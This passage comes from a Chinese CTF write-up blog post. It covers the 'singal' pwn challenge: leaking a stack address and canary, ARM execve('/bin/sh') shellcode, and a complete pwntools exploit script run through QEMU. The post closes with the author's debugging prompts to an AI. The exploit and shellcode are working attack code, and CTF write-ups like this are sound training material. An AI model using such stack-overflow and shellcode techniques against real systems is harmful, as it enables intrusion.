+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-026.png"></p>
+<p>如下图，我们发现 s 是写道栈上的，且 s+1 可以作为一个指针，s+1 实际上就是栈上的 var_C 写在 s 之后，存放读入 s 的地址，那么就考虑到<code>(void *)(a1 + 1)</code>可以当作一个栈地址的泄露。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-027.png"><!-- 这是一张图片，ocr 内容为： --><br><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-028.png"></p>
+<p>动态调试一下，在 sprintf 处下断点：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-029.png"></p>
+<p>发现确实在后面有一个指针，指针地址就是一开始写入数据的地址，并且在指针之后还有 canary，也就是前面看到的栈上 var_8，我们可以利用两次把栈地址和 canary 都泄露出来：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-030.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">15:0054      0x407ffcf4 ◂— 0x60b91800</span><br><span class="line">16:0058      0x407ffcf8 ◂— 0</span><br><span class="line">17:005c      0x407ffcfc —▸ 0x412f3c ◂— 0x12e34</span><br><span class="line">18:0060      0x407ffd00 —▸ 0x407ffd6c —▸ 0x408a27b4 (__libc_start_main+268) ◂— bl <span class="built_in">exit</span></span><br><span class="line">19:0064  r11 0x407ffd04 —▸ 0x401904 ◂— b 0x401930 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">1a:0068      0x407ffd08 —▸ 0x411e5460 ◂— 1</span><br><span class="line">1b:006c      0x407ffd0c ◂— 1</span><br><span class="line">1c:0070      0x407ffd10 ◂— 1</span><br><span class="line">1d:0074      0x407ffd14 ◂— 5</span><br><span class="line">1e:0078      0x407ffd18 —▸ 0x401f0002 ◂— 0</span><br><span class="line">1f:007c      0x407ffd1c ◂— 0x100007f</span><br><span class="line">20:0080      0x407ffd20 —▸ 0x408425c8 (_rtld_global+1368) —▸ 0x40810000 ◂— 0x464c457f</span><br><span class="line">21:0084      0x407ffd24 ◂— 0xffffffff</span><br><span class="line">22:0088 r2-1 0x407ffd28 ◂— 0x61616100</span><br><span class="line">23:008c      0x407ffd2c ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">... ↓        10 skipped</span><br><span class="line">2e:00b8      0x407ffd58 —▸ 0x407ffd0a ◂— 0x1411e</span><br><span class="line">2f:00bc      0x407ffd5c ◂— 0x60b91800</span><br><span class="line">30:00c0      0x407ffd60 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以得到从 0089 开始输入内容，00b8 中存在栈地址，00bc 存放着 canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-031.png"></p>
+<p>然后我们接下来就可以去泄露栈地址和 canary：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">enter_record()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x2f</span>)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line">enter_record()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x33</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x33</span>)</span><br><span class="line">canary = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line">log.success(<span class="string">&quot;stack:  &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">log.success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-032.png"></p>
+<p>很奇妙的是，当填充至 0x2f 的时候，除了最后的换行符会多加一个 0xa 的数据，栈地址指针发生了变化，不再指向填入数据的开头，转而指向了 __libc_start_main。</p>
+<h4 id="ret2shellcode："><a href="#ret2shellcode：" class="headerlink" title="ret2shellcode："></a>ret2shellcode：</h4><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-033.png"></p>
+<p>我们拿到了栈地址和 canary 就可以直接进行栈溢出，打 ret2shellcode 了，这里我们在之前说过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">recv_menu()</span><br><span class="line">r.sendline(b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(b<span class="string">&quot; a while\n\x1B[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">set_light(b<span class="string">&quot;1 4&quot;</span>)</span><br><span class="line">r.recvuntil(b<span class="string">&quot;How long do you need to walk: &quot;</span>)</span><br><span class="line"><span class="comment"># r.sendline(b&quot;65535&quot;)</span></span><br><span class="line">r.sendline(str(0xffffffff))</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    adr r0, binsh</span></span><br><span class="line"><span class="string">    eor r2, r2</span></span><br><span class="line"><span class="string">    push &#123;r2&#125;</span></span><br><span class="line"><span class="string">    push &#123;r0&#125;</span></span><br><span class="line"><span class="string">    mov r1, sp</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">binsh:</span></span><br><span class="line"><span class="string">    .ascii &quot;</span>/bin/sh\\0<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.recvuntil(b<span class="string">&quot;registration information:&quot;</span>)</span><br><span class="line">payload = shellcode.ljust(0x30, b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">payload += p32(canary) + p32(0)*3</span><br><span class="line">payload += p32(ret)*2</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>解释一下 shellcode </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">adr r0, binsh       // r0 = &amp;&quot;/bin/sh&quot; (execve 第 1 个参数: 可执行文件路径) */</span><br><span class="line">eor r2, r2          // r2 = 0 (execve 第 3 个参数: envp = NULL，同时清零以便构造成 NULL 哨兵) */</span><br><span class="line">push &#123;r2&#125;           // 栈顶压入 NULL (作为 argv 数组的结束符) */</span><br><span class="line">push &#123;r0&#125;           // 栈顶压入 &amp;&quot;/bin/sh&quot; (作为 argv[0]) */</span><br><span class="line">mov r1, sp          // r1 = SP (execve 第 2 个参数: argv 指针数组首地址 [&amp;&quot;/bin/sh&quot;, NULL]) */</span><br><span class="line">mov r7, #11         // r7 = 11 (__NR_execve 系统调用号) */</span><br><span class="line">svc 0               // 触发软中断陷入内核，执行 execve(&quot;/bin/sh&quot;, argv, NULL) */</span><br><span class="line">     binsh:</span><br><span class="line">          .ascii &quot;/bin/sh\0&quot;  // 目标路径字符串，以 &#x27;\0&#x27; 结尾 */</span><br></pre></td></tr></table></figure>
+
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;arm&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line">server = listen(PORT)</span><br><span class="line"></span><br><span class="line">r = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;./cli&quot;</span>])</span><br><span class="line"><span class="comment">#r = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;..&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./cli&quot;]) </span></span><br><span class="line"></span><br><span class="line">s = server.wait_for_connection()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">record_msg = <span class="string">b&quot;You are about to run a red light, the surveillance system will take photos to record it!\n&quot;</span></span><br><span class="line">wait_msg = <span class="string">b&quot;waiting 1s...\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_light</span>(<span class="params">light</span>):</span><br><span class="line">    s.recvuntil(<span class="string">b&quot;signal\n&quot;</span>)</span><br><span class="line">    s.sendline(light)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_menu</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;target: &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_record</span>():</span><br><span class="line">    recv_menu()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        set_light(<span class="string">b&quot;3 5&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        data = r.recvuntil((record_msg, wait_msg), timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> record_msg <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        set_light(<span class="string">b&quot;2 5&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> r.recvuntil(<span class="string">b&quot;target: &quot;</span>, timeout=<span class="number">8</span>):</span><br><span class="line">            log.failure(<span class="string">&quot;stuck in waiting, rerun exploit&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter_record()</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2f</span>)</span><br><span class="line"><span class="comment"># r.sendline(b&quot;a&quot; * 0x2F)</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">enter_record()</span><br><span class="line">r.sendline(<span class="string">b&quot;a&quot;</span> * <span class="number">0x33</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;a&quot;</span> * <span class="number">0x33</span>)</span><br><span class="line">canary = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;stack:  &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">log.success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ret = stack - <span class="number">0x3c</span></span><br><span class="line">log.success(<span class="string">&quot;ret:    &quot;</span> + <span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">recv_menu()</span><br><span class="line">r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot; a while\n\x1B[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">set_light(<span class="string">b&quot;1 4&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;How long do you need to walk: &quot;</span>)</span><br><span class="line"><span class="comment"># r.sendline(b&quot;65535&quot;)</span></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adr r0, binsh</span></span><br><span class="line"><span class="string">    eor r2, r2</span></span><br><span class="line"><span class="string">    push &#123;r2&#125;</span></span><br><span class="line"><span class="string">    push &#123;r0&#125;</span></span><br><span class="line"><span class="string">    mov r1, sp</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">binsh:</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;registration information:&quot;</span>)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x30</span>, <span class="string">b&quot;c&quot;</span>)</span><br><span class="line">payload += p32(canary) + p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p32(ret)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-034.png"></p>
+<hr>
+<p>在写题目期间遇到了不少问题，和 ai 交流了一番：呃呃呃</p>
+<p>目录下有一个 exp.py，是可以打通的，但是现在有几个问题：</p>
+<p>原文件只有cli  ld-linux.so.3  libc.so.6  libpthread.so.0</p>
+<ol>
+<li>我需要打通的是 cli_patched，但是我确定这个 cli_patched 是否 patch 成功</li>
+<li>如果 patch 成功，就去把这个 cli_patched 打通，如果不成功，告诉我为什么，并修复</li>
+<li>exp.py 虽然在本地可以打通，但是把 libc_base 写死了，我们在打远程环境的时候通常不可以这么做，因此不考虑写死 libc_base 的方法</li>
+<li>题解给出的是打 ret2shellcode，我希望按照这种方法走</li>
+</ol>
+<p>一些有关qemu的知识：qemu起的虚拟环境保护全关。关闭了ASLR：启动的地址是固定的；关闭了NX：shellcode可执行。通过判断远程环境是qemu起的还是实体机起的，如果是qemu一般直接用ret2shellcode，否则泄露+attack。即使所给的二进制文件开了NX和pie，也只是对真机环境有效，qemu中还是没有保护。</p>
+<p>上面是很多人总结的信息，说栈地址是可执行的，为什么我的不可执行</p>
+<p>还是没有获取到 shell 啊，另外我希望就和博客中一样，既能够打通本地，也可以打通远程</p>
+<p>按照打远程的方式打本地，把本地打通，之前不是给过别人的博客文章，别人的思路都有了，为什么不能和他写的类似</p>
+<p>STACK_PAGE &#x3D; 0x40800000 不要这种写死的数据</p>
+<p>可以参考这个脚本</p>
+<p>那不打 cli_patched 了，去打 cli 即可，依旧要求栈可执行，cli 文件的 0x2f 偏移是正确的</p>
+<p>当前脚本不能复用的原因是什么</p>
+<p>问几个问题：</p>
+<ol>
+<li>当前这个二进制文件是否栈可执行</li>
+<li>如果栈可执行，为什么我给的脚本不能够复用</li>
+<li>当前在思考什么，问题卡在哪里了</li>
+</ol>
+<p>泄露出的 stack 是什么</p>
+<p>按照这个解释一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-035.png"></p>
+<hr>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/z22168/article/details/151622368">https://blog.csdn.net/z22168/article/details/151622368</a></p>
+<hr>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/HFTTC.github.io/images/pwn/covers/xihulunjian-2025-pwn.jpg" data-sizes="auto" alt="西湖论剑 2025 PWN" class="lazyload">
+      <a href="/HFTTC.github.io/2026/08/12/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202025-pwn/" aria-label="后一篇: 西湖论剑 2025 PWN"  title="后一篇: 西湖论剑 2025 PWN"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          西湖论剑 2025 PWN
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        279.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        23:02
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#digtal-bomb%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">digtal_bomb：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">main：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">菜单：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#modify%EF%BC%9A"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">modify：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解法一：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-base%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">泄露 libc_base：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%B1%80%EF%BC%9A"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">构造基本格局：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E5%A4%9A%E4%BD%99%E7%9A%84-fd-%E5%92%8C-bk-%E6%8C%87%E9%92%88%EF%BC%9A"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">清理多余的 fd 和 bk 指针：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%A0%86%E5%A4%B4%EF%BC%9A"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">伪造第二个堆头：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Unlink%EF%BC%9A"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">Unlink：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-unlink-%E8%AF%BB%E5%8F%96-libc%EF%BC%9A"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">触发 unlink 读取 libc：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-base"><span class="toc-number">1.2.2.</span> <span class="toc-text">泄露 heap_base:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#teache-poisioning"><span class="toc-number">1.2.3.</span> <span class="toc-text">teache poisioning</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#singal%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">singal：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-main-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析 main 函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-BAC"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">sub_BAC</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sub-123C%EF%BC%9A"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">sub_123C：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#case1%EF%BC%9A"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">case1：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#case2%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">case2：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text">过随机数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-canary%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">泄露 canary：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode%EF%BC%9A"><span class="toc-number">2.2.3.</span> <span class="toc-text">ret2shellcode：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">145</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
